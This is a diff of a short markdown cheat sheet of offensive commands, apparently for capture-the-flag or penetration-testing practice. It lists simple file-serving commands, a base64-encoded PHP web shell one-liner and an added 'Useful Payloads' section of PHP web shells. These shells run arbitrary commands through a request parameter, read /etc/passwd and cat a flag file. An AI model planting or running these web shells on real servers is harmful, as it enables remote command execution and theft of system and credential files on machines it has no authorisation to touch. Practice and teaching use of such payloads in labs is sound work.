@@ -3,7 +3,9 @@
 # Useful Commands
 
 HTTP Server
+```bash
 sudo python3 -m http.server <LISTENING_PORT>
+```
 
 FTP Server
 sudo python3 -m pyftpdlib -p 21
@@ -17,3 +19,8 @@ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep 
 
 Base64 PHP Shell
 echo '<?php system($_GET["cmd"]); ?>' | base64
+
+# Useful Payloads
+<?php file_get_contents('/etc/passwd'); ?>
+<?php system('cat /flag.txt'); ?>
+<?php system($_REQUEST['cmd']); ?>
